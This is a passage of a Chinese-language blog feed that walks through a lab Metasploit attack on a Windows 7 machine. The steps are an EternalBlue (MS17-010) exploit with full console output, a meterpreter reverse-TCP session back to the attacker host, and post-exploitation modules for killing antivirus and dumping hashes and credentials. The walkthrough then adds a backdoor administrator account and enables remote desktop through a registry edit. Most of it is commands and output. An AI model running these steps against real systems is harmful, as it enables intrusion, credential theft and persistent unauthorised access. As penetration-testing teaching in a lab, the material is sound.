target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic Target</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置目标主机</span></span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set RHOSTS 192.168.80.130</span><br><span class="line">RHOSTS =&gt; 192.168.80.130</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">确认攻击参数</span></span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/smb/ms17_010_eternalblue):</span><br><span class="line"></span><br><span class="line">   Name           Current Setting  Required  Description</span><br><span class="line">   ----           ---------------  --------  -----------</span><br><span class="line">   RHOSTS         192.168.80.130   yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit</span><br><span class="line">   RPORT          445              yes       The target port (TCP)</span><br><span class="line">   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2,</span><br><span class="line">                                              Windows 7, Windows Embedded Standard 7 target machines.</span><br><span class="line">   SMBPass                         no        (Optional) The password for the specified username</span><br><span class="line">   SMBUser                         no        (Optional) The username to authenticate as</span><br><span class="line">   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Win</span><br><span class="line">                                             dows 7, Windows Embedded Standard 7 target machines.</span><br><span class="line">   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Wi</span><br><span class="line">                                             ndows Embedded Standard 7 target machines.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/x64/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  thread           yes       Exit technique (Accepted: &#x27;&#x27;, seh, thread, process, none)</span><br><span class="line">   LHOST     192.168.80.128   yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic Target</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">发起攻击</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">攻击成功后攻击机和目标机之间会建立一个连接，得到一个meterpreter会话</span></span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.80.128:4444 </span><br><span class="line">[*] 192.168.80.130:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check</span><br><span class="line">[+] 192.168.80.130:445    - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7600 x64 (64-bit)</span><br><span class="line">[*] 192.168.80.130:445    - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[+] 192.168.80.130:445 - The target is vulnerable.</span><br><span class="line">[*] 192.168.80.130:445 - Connecting to target for exploitation.</span><br><span class="line">[+] 192.168.80.130:445 - Connection established for exploitation.</span><br><span class="line">[+] 192.168.80.130:445 - Target OS selected valid for OS indicated by SMB reply</span><br><span class="line">[*] 192.168.80.130:445 - CORE raw buffer dump (23 bytes)</span><br><span class="line">[*] 192.168.80.130:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 55 6c 74 69 6d 61  Windows 7 Ultima</span><br><span class="line">[*] 192.168.80.130:445 - 0x00000010  74 65 20 37 36 30 30                             te 7600         </span><br><span class="line">[+] 192.168.80.130:445 - Target arch selected valid for arch indicated by DCE/RPC reply</span><br><span class="line">[*] 192.168.80.130:445 - Trying exploit with 12 Groom Allocations.</span><br><span class="line">[*] 192.168.80.130:445 - Sending all but last fragment of exploit packet</span><br><span class="line">[*] 192.168.80.130:445 - Starting non-paged pool grooming</span><br><span class="line">[+] 192.168.80.130:445 - Sending SMBv2 buffers</span><br><span class="line">[+] 192.168.80.130:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.</span><br><span class="line">[*] 192.168.80.130:445 - Sending final SMBv2 buffers.</span><br><span class="line">[*] 192.168.80.130:445 - Sending last fragment of exploit packet!</span><br><span class="line">[*] 192.168.80.130:445 - Receiving response from exploit packet</span><br><span class="line">[+] 192.168.80.130:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!</span><br><span class="line">[*] 192.168.80.130:445 - Sending egg to corrupted connection.</span><br><span class="line">[*] 192.168.80.130:445 - Triggering free of corrupted buffer.</span><br><span class="line">[-] 192.168.80.130:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line">[-] 192.168.80.130:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=FAIL-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line">[-] 192.168.80.130:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line">[*] 192.168.80.130:445 - Connecting to target for exploitation.</span><br><span class="line">[+] 192.168.80.130:445 - Connection established for exploitation.</span><br><span class="line">[+] 192.168.80.130:445 - Target OS selected valid for OS indicated by SMB reply</span><br><span class="line">[*] 192.168.80.130:445 - CORE raw buffer dump (23 bytes)</span><br><span class="line">[*] 192.168.80.130:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 55 6c 74 69 6d 61  Windows 7 Ultima</span><br><span class="line">[*] 192.168.80.130:445 - 0x00000010  74 65 20 37 36 30 30                             te 7600         </span><br><span class="line">[+] 192.168.80.130:445 - Target arch selected valid for arch indicated by DCE/RPC reply</span><br><span class="line">[*] 192.168.80.130:445 - Trying exploit with 17 Groom Allocations.</span><br><span class="line">[*] 192.168.80.130:445 - Sending all but last fragment of exploit packet</span><br><span class="line">[*] 192.168.80.130:445 - Starting non-paged pool grooming</span><br><span class="line">[+] 192.168.80.130:445 - Sending SMBv2 buffers</span><br><span class="line">[+] 192.168.80.130:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.</span><br><span class="line">[*] 192.168.80.130:445 - Sending final SMBv2 buffers.</span><br><span class="line">[*] 192.168.80.130:445 - Sending last fragment of exploit packet!</span><br><span class="line">[*] 192.168.80.130:445 - Receiving response from exploit packet</span><br><span class="line">[+] 192.168.80.130:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">永恒之蓝覆盖成功！</span></span><br><span class="line">[*] 192.168.80.130:445 - Sending egg to corrupted connection.</span><br><span class="line">[*] 192.168.80.130:445 - Triggering free of corrupted buffer.</span><br><span class="line">[*] Sending stage (200774 bytes) to 192.168.80.130</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.80.128:4444 -&gt; 192.168.80.130:49159) at 2022-11-28 00:07:45 +0800</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">攻击机与目标主机建立了一个shell会话。</span></span><br><span class="line">[+] 192.168.80.130:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line">[+] 192.168.80.130:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line">[+] 192.168.80.130:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br></pre></td></tr></table></figure><h3 id="（6）后渗透攻击"><a href="#（6）后渗透攻击" class="headerlink" title="（6）后渗透攻击"></a>（6）后渗透攻击</h3><p>该模块主要用于对目标机进行进一步渗透，以下是post模块中常用命令：</p><ul><li>run post&#x2F;windows&#x2F;gather&#x2F;checkvm  # 查看目标主机是否允许在虚拟机上</li><li>run post&#x2F;windows&#x2F;manage&#x2F;migrate  # 自动进程迁移</li><li>run post&#x2F;windows&#x2F;manage&#x2F;killav      # 关闭杀毒软件</li><li>run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp   # 开启远程桌面服务</li><li>run post&#x2F;windows&#x2F;manage&#x2F;autoroute      # 查看路由信息</li><li>run post&#x2F;windows&#x2F;gather&#x2F;enum_logged_on_users   # 列举当前登录的用户</li><li>run post&#x2F;windows&#x2F;gather&#x2F;enum_applications            # 列举应用程序</li><li>run post&#x2F;windows&#x2F;gather&#x2F;credentials&#x2F;windows_autologin  # 抓取自动登录的用户名和密码</li><li>run post&#x2F;windows&#x2F;gather&#x2F;smart_hashdump   # dump 出所有用户的 hash</li></ul><h4 id="6-1-获取-shell-，设置编码，查看-ip-信息"><a href="#6-1-获取-shell-，设置编码，查看-ip-信息" class="headerlink" title="6.1 获取 shell ，设置编码，查看 ip 信息"></a>6.1 获取 shell ，设置编码，查看 ip 信息</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">尝试获取 shell</span></span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 232 created.</span><br><span class="line">Channel 1 created.</span><br><span class="line">Microsoft Windows [�汾 6.1.7600]</span><br><span class="line">��Ȩ���� (c) 2009 Microsoft Corporation����������Ȩ����</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">解决乱码问题（部分乱码可解决）</span></span><br><span class="line">C:\Windows\system32&gt;chcp 65001</span><br><span class="line">chcp 65001</span><br><span class="line">Active code page: 65001</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看ip信息</span></span><br><span class="line">C:\Windows\system32&gt;ipconfig</span><br><span class="line">ipconfig</span><br><span class="line"></span><br><span class="line">Windows IP Configuration</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Ethernet adapter Bluetooth ��������:</span><br><span class="line"></span><br><span class="line">   Media State . . . . . . . . . . . : Media disconnected</span><br><span class="line">   Connection-specific DNS Suffix  . : </span><br><span class="line"></span><br><span class="line">Ethernet adapter ��������:</span><br><span class="line"></span><br><span class="line">   Connection-specific DNS Suffix  . : localdomain</span><br><span class="line">   Link-local IPv6 Address . . . . . : fe80::d927:d59a:fcdc:3a83%11</span><br><span class="line">   IPv4 Address. . . . . . . . . . . : 192.168.80.130</span><br><span class="line">   Subnet Mask . . . . . . . . . . . : 255.255.255.0</span><br><span class="line">   Default Gateway . . . . . . . . . : 192.168.80.2</span><br></pre></td></tr></table></figure><h4 id="6-2-创建用户，赋予最高权限"><a href="#6-2-创建用户，赋予最高权限" class="headerlink" title="6.2 创建用户，赋予最高权限"></a>6.2 创建用户，赋予最高权限</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看当前所有用户</span></span><br><span class="line">C:\Users\root\Documents&gt;net user</span><br><span class="line">net user</span><br><span class="line"></span><br><span class="line">User accounts for \\</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">admin                    Administrator            ghost                    </span><br><span class="line">Guest                    root                     ying                     </span><br><span class="line">The command completed with one or more errors.</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">添加 admin 用户</span></span><br><span class="line">C:\Users\root\Documents&gt;net user admin</span><br><span class="line">net user admin</span><br><span class="line">User name                    admin</span><br><span class="line">Full Name                    </span><br><span class="line">Comment                      </span><br><span class="line">User&#x27;s comment               </span><br><span class="line">Country code                 000 (System Default)</span><br><span class="line">Account active               Yes</span><br><span class="line">Account expires              Never</span><br><span class="line"></span><br><span class="line">Password last set            2022/11/28 1:11:57</span><br><span class="line">Password expires             2023/1/9 1:11:57</span><br><span class="line">Password changeable          2022/11/28 1:11:57</span><br><span class="line">Password required            Yes</span><br><span class="line">User may change password     Yes</span><br><span class="line"></span><br><span class="line">Workstations allowed         All</span><br><span class="line">Logon script                 </span><br><span class="line">User profile                 </span><br><span class="line">Home directory               </span><br><span class="line">Last logon                   Never</span><br><span class="line"></span><br><span class="line">Logon hours allowed          All</span><br><span class="line"></span><br><span class="line">Local Group Memberships      *Users                </span><br><span class="line">Global Group memberships     *None                 </span><br><span class="line">The command completed successfully.</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看 root 用户信息</span></span><br><span class="line">C:\Users\root\Documents&gt;net user root</span><br><span class="line">net user root</span><br><span class="line">User name                    root</span><br><span class="line">Full Name                    </span><br><span class="line">Comment                      </span><br><span class="line">User&#x27;s comment               </span><br><span class="line">Country code                 000 (System Default)</span><br><span class="line">Account active               Yes</span><br><span class="line">Account expires              Never</span><br><span class="line"></span><br><span class="line">Password last set            2022/11/27 23:31:04</span><br><span class="line">Password expires             Never</span><br><span class="line">Password changeable          2022/11/27 23:31:04</span><br><span class="line">Password required            No</span><br><span class="line">User may change password     Yes</span><br><span class="line"></span><br><span class="line">Workstations allowed         All</span><br><span class="line">Logon script                 </span><br><span class="line">User profile                 </span><br><span class="line">Home directory               </span><br><span class="line">Last logon                   2022/11/28 1:08:41</span><br><span class="line"></span><br><span class="line">Logon hours allowed          All</span><br><span class="line"></span><br><span class="line">Local Group Memberships      *Administrators       </span><br><span class="line">Global Group memberships     *None                 </span><br><span class="line">The command completed successfully.</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">添加 admin 用户至 administrators 用户组，获取最高权限</span></span><br><span class="line">C:\Users\root\Documents&gt;net localgroup administrators admin /add </span><br><span class="line">net localgroup administrators admin /add</span><br><span class="line">The command completed successfully.</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看 admin 用户信息</span></span><br><span class="line">C:\Users\root\Documents&gt;net user admin </span><br><span class="line">net user admin </span><br><span class="line">User name                    admin</span><br><span class="line">Full Name                    </span><br><span class="line">Comment                      </span><br><span class="line">User&#x27;s comment               </span><br><span class="line">Country code                 000 (System Default)</span><br><span class="line">Account active               Yes</span><br><span class="line">Account expires              Never</span><br><span class="line"></span><br><span class="line">Password last set            2022/11/28 1:11:57</span><br><span class="line">Password expires             2023/1/9 1:11:57</span><br><span class="line">Password changeable          2022/11/28 1:11:57</span><br><span class="line">Password required            Yes</span><br><span class="line">User may change password     Yes</span><br><span class="line"></span><br><span class="line">Workstations allowed         All</span><br><span class="line">Logon script                 </span><br><span class="line">User profile                 </span><br><span class="line">Home directory               </span><br><span class="line">Last logon                   Never</span><br><span class="line"></span><br><span class="line">Logon hours allowed          All</span><br><span class="line"></span><br><span class="line">Local Group Memberships      *Administrators       *Users                </span><br><span class="line">Global Group memberships     *None                 </span><br><span class="line">The command completed successfully.</span><br></pre></td></tr></table></figure><h4 id="6-3-查看并启用-3389-远程连接端口"><a href="#6-3-查看并启用-3389-远程连接端口" class="headerlink" title="6.3 查看并启用 3389 远程连接端口"></a>6.3 查看并启用 3389 远程连接端口</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看端口状态（3389 端口是否开启）</span></span><br><span class="line">C:\Windows\system32&gt;netstat -ano</span><br><span class="line">netstat -ano</span><br><span class="line"></span><br><span class="line">Active Connections</span><br><span class="line"></span><br><span class="line">  Proto  Local Address          Foreign Address        State           PID</span><br><span class="line">  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       620</span><br><span class="line">  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4</span><br><span class="line">  TCP    0.0.0.0:5357           0.0.0.0:0              LISTENING       4</span><br><span class="line">  TCP    0.0.0.0:49152          0.0.0.0:0              LISTENING       332</span><br><span class="line">  TCP    0.0.0.0:49153          0.0.0.0:0              LISTENING       452</span><br><span class="line">  TCP    0.0.0.0:49154          0.0.0.0:0              LISTENING       896</span><br><span class="line">  TCP    0.0.0.0:49155          0.0.0.0:0              LISTENING       860</span><br><span class="line">  TCP    0.0.0.0:49156          0.0.0.0:0              LISTENING       428</span><br><span class="line">  TCP    0.0.0.0:49158          0.0.0.0:0              LISTENING       1700</span><br><span class="line">  TCP    192.168.80.130:139     0.0.0.0:0              LISTENING       4</span><br><span class="line">  TCP    192.168.80.130:49159   192.168.80.128:4444    ESTABLISHED     1044</span><br><span class="line">  TCP    [::]:135               [::]:0                 LISTENING       620</span><br><span class="line">  TCP    [::]:445               [::]:0                 LISTENING       4</span><br><span class="line">  TCP    [::]:5357              [::]:0                 LISTENING       4</span><br><span class="line">  TCP    [::]:49152             [::]:0                 LISTENING       332</span><br><span class="line">  TCP    [::]:49153             [::]:0                 LISTENING       452</span><br><span class="line">  TCP    [::]:49154             [::]:0                 LISTENING       896</span><br><span class="line">  TCP    [::]:49155             [::]:0                 LISTENING       860</span><br><span class="line">  TCP    [::]:49156             [::]:0                 LISTENING       428</span><br><span class="line">  TCP    [::]:49158             [::]:0                 LISTENING       1700</span><br><span class="line">  UDP    0.0.0.0:500            *:*                                    860</span><br><span class="line">  UDP    0.0.0.0:3702           *:*                                    1676</span><br><span class="line">  UDP    0.0.0.0:3702           *:*                                    1676</span><br><span class="line">  UDP    0.0.0.0:4500           *:*                                    860</span><br><span class="line">  UDP    0.0.0.0:5355           *:*                                    304</span><br><span class="line">  UDP    0.0.0.0:62440          *:*                                    1676</span><br><span class="line">  UDP    127.0.0.1:1900         *:*                                    1676</span><br><span class="line">  UDP    127.0.0.1:53830        *:*                                    1676</span><br><span class="line">  UDP    192.168.80.130:137     *:*                                    4</span><br><span class="line">  UDP    192.168.80.130:138     *:*                                    4</span><br><span class="line">  UDP    192.168.80.130:1900    *:*                                    1676</span><br><span class="line">  UDP    192.168.80.130:53829   *:*                                    1676</span><br><span class="line">  UDP    [::]:500               *:*                                    860</span><br><span class="line">  UDP    [::]:3702              *:*                                    1676</span><br><span class="line">  UDP    [::]:3702              *:*                                    1676</span><br><span class="line">  UDP    [::]:4500              *:*                                    860</span><br><span class="line">  UDP    [::]:5355              *:*                                    304</span><br><span class="line">  UDP    [::]:62441             *:*                                    1676</span><br><span class="line">  UDP    [::1]:1900             *:*                                    1676</span><br><span class="line">  UDP    [::1]:53828            *:*                                    1676</span><br><span class="line">  UDP    [fe80::d927:d59a:fcdc:3a83%11]:1900  *:*                                    1676</span><br><span class="line">  UDP    [fe80::d927:d59a:fcdc:3a83%11]:53827  *:*                                    1676</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动 3389 远程连接端口</span></span><br><span class="line">C:\Windows\system32&gt;REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br><span class="line">The operation completed successfully.</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">确认端口是否开启</span></span><br><span class="line">C:\Windows\system32&gt;netstat -ano</span><br><span class="line">netstat -ano</span><br><span class="line"></span><br><span class="line">Active Connections</span><br><span class="line"></span><br><span class="line">  Proto  Local Address          Foreign Address        State           PID</span><br><span class="line">  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       620</span><br><span class="line">  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4</span><br><span class="line">  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       304</span><br><span class="line">  TCP    0.0.0.0:5357           0.0.0.0:0              LISTENING       4</span><br><span class="line">  TCP    0.0.0.0:49152          0.0.0.0:0              LISTENING       332</span><br><span class="line">  TCP    0.0.0.0:49153          0.0.0.0:0              LISTENING       452</span><br><span class="line">  TCP    0.0.0.0:49154          0.0.0.0:0              LISTENING       896</span><br><span class="line">  TCP    0.0.0.0:49155          0.0.0.0:0              LISTENING       860</span><br><span class="line">  TCP    0.0.0.0:49156          0.0.0.0:0              LISTENING       428</span><br><span class="line">  TCP    0.0.0.0:49158          0.0.0.0:0              LISTENING       1700</span><br><span class="line">  TCP    192.168.80.130:139     0.0.0.0:0              LISTENING       4</span><br><span class="line">  TCP    192.168.80.130:49159   192.168.80.128:4444    ESTABLISHED     1044</span><br><span class="line">  TCP    [::]:135               [::]:0                 LISTENING       620</span><br><span class="line">  TCP    [::]:445               [::]:0                 LISTENING       4</span><br><span class="line">  TCP    [::]:3389              [::]:0                 LISTENING       304</span><br><span class="line">  TCP    [::]:5357              [::]:0                 LISTENING       4</span><br><span class="line">  TCP    [::]:49152             [::]:0                 LISTENING       332</span><br><span class="line">  TCP    [::]:49153             [::]:0                 LISTENING       452</span><br><span class="line">  TCP    [::]:49154             [::]:0                 LISTENING       896</span><br><span class="line">  TCP    [::]:49155             [::]:0                 LISTENING       860</span><br><span class="line">  TCP    [::]:49156             [::]:0                 LISTENING       428</span><br><span class="line">  TCP    [::]:49158             [::]:0                 LISTENING       1700</span><br><span class="line">  UDP    0.0.0.0:500            *:*                                    860</span><br><span class="line">  UDP    0.0.0.0:3702           *:*                                    1676</span><br><span class="line">  UDP    0.0.0.0:3702           *:*                                    1676</span><br><span class="line">  UDP    0.0.0.0:4500           *:*                                    860</span><br><span class="line">  UDP    0.0.0.0:5355           *:*                                    304</span><br><span class="line">  UDP    0.0.0.0:62440          *:*                                    1676</span><br><span class="line">  UDP    127.0.0.1:1900         *:*                                    1676</span><br><span class="line">  UDP    127.0.0.1:53830        *:*                                    1676</span><br><span class="line">  UDP    192.168.80.130:137     *:*                                    4</span><br><span class="line">  UDP    192.168.80.130:138     *:*                                    4</span><br><span class="line">  UDP    192.168.80.130:1900    *:*                                    1676</span><br><span class="line">  UDP    192.168.80.130:53829   *:*                                    1676</span><br><span class="line">  UDP    [::]:500               *:*                                    860</span><br><span class="line">  UDP    [::]:3702              *:*                                    1676</span><br><span class="line">  UDP    [::]:3702              *:*                                    1676</span><br><span class="line">  UDP    [::]:4500              *:*                                    860</span><br><span class="line">  UDP    [::]:5355              *:*                                    304</span><br><span class="line">  UDP    [::]:62441             *:*                                    1676</span><br><span class="line">  UDP    [::1]:1900             *:*                                    1676</span><br><span class="line">  UDP    [::1]:53828            *:*                                    1676</span><br><span class="line">  UDP    [fe80::d927:d59a:fcdc:3a83%11]:546  *:*                                    896</span><br><span class="line">  UDP    [fe80::d927:d59a:fcdc:3a83%11]:1900  *:*                                    1676</span><br><span class="line">  UDP    [fe80::d927:d59a:fcdc:3a83%11]:53827  *:*                                    1676</span><br></pre></td></tr></table></figure><h4 id="6-4-启用远程桌面，进入目标机"><a href="#6-4-启用远程桌面，进入目标机" class="headerlink" title="6.4 启用远程桌面，进入目标机"></a>6.4 启用远程桌面，进入目标机</h4><p><img src="/blog/47950b11.html/image-20221128012438324.png"></p><p><img src="/blog/47950b11.html/image-20221128012419130.png"></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网安工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>john 使用教程</title>
      <link href="/blog/ce00cf55.html/"/>
      <url>/blog/ce00cf55.html/</url>
      
